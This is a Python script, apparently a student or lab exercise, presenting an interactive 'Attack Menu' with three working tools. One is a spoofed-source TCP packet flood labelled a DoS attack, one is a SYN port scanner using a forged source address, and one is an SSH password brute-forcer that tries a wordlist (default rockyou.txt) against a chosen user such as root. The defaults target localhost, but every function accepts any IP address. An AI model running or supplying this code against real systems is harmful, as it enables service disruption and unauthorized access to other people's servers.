from scapy.all import IP, TCP, send, sr1
import random
import argparse
import paramiko
import time


def dosAttack(targetIP, targetPort):
    print(f"Starting test against {targetIP}:{targetPort}...")
    interface="eth0"

    for i in range(1, 100):
        src_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
        #src_ip = "4.4.4.4"
    
        # We use / to stack layers in Scapy
        sport=random.randint(1024,65535)
        packet = IP(src=src_ip, dst=targetIP) / TCP(dport=targetPort, sport=sport)
        print(f"packet sent from \t{src_ip}:{sport}\t at {targetIP}:{targetPort} ...")
        
        send(packet,iface=interface ,verbose=0)


def bruteForce(targetIP, targetPort, username, password):
    print(f"Starting SSH Brute Force on {targetIP}:{targetPort}...")
    
    ssh = paramiko.SSHClient()
    # Automatically add host keys
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    wordlist_path=password

    try:
        with open(wordlist_path, 'r', encoding='latin-1') as f:
            for line in f:
                password = line.strip()
                try:
                    # Attempt connection
                    ssh.connect(targetIP, port=targetPort, username=username, password=password, timeout=3)
                    print(f"[SUCCESS] Found password: {password}")
                    ssh.close()
                    return password
                except paramiko.AuthenticationException:
                    print(f"[FAIL] Attempt: {password}")
                except Exception as e:
                    print(f"[ERROR] {e}")
                    time.sleep(2) # Wait if the server is throttling
    except FileNotFoundError:
        print("Wordlist not found.")
    
    return None
    pass

def portScanner(targetIP,targetPort):
    src_port=random.randint(0,1000)
    #src_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
    src_ip = "4.4.4.4"
    packet = IP(src=src_ip,dst=targetIP)/TCP(sport=src_port,dport=targetPort, flags ="S")
    response = sr1(packet, timeout=2, verbose=0)
    if response is None:
        return "Filtered"
    elif response.haslayer(TCP):
        if response.getlayer(TCP).flags == 0x12:
            sending_packet = IP(dst=targetIP)/TCP(sport=src_port,dport=targetPort, flags ="R")
            sr1(sending_packet, timeout=2, verbose=0)
            return "Open"
        elif response.getlayer(TCP).flags==0x14:
            return "Closed"

    return "Unknown"
    


def main():
    while True:
        print("\n==== Attack Menu ====")
        print("1. Exit")
        print("2. DOS Attack")
        print("3. Port Scanning")
        print("4. Brute Force (to be verified)")
        
        choice = input("Enter your choice: ").strip()

        if choice == "1":
            print("Exiting...")
            break

        elif choice == "2":
            targetIP = input("Enter target IP (default 127.0.0.1): ") or "127.0.0.1"
            targetPort = input("Enter target Port (default 22): ") or "22"

            dosAttack(targetIP, int(targetPort))

        elif choice == "3":
            targetIP = input("Enter target IP (default 127.0.0.1): ") or "127.0.0.1"
            ports = input("Enter number of ports to scan (default 100): ") or "100"

            print(f"Starting port scanner on {targetIP}")
            for i in range(1, int(ports) + 1):
                result = portScanner(targetIP, i)
                if result == "Open":
                    print(f"Port {i} is {result}")

        elif choice == "4":
            targetIP = input("Enter target IP (default 127.0.0.1): ") or "127.0.0.1"
            targetPort = input("Enter target Port (default 22): ") or "22"
            user = input("Enter username (default root): ") or "root"
            wordlist = input("Enter wordlist file (default rockyou.txt): ") or "rockyou.txt"

            bruteForce(targetIP, int(targetPort), user, wordlist)

        else:
            print("Invalid choice. Try again.")


if __name__ == "__main__":
    main()
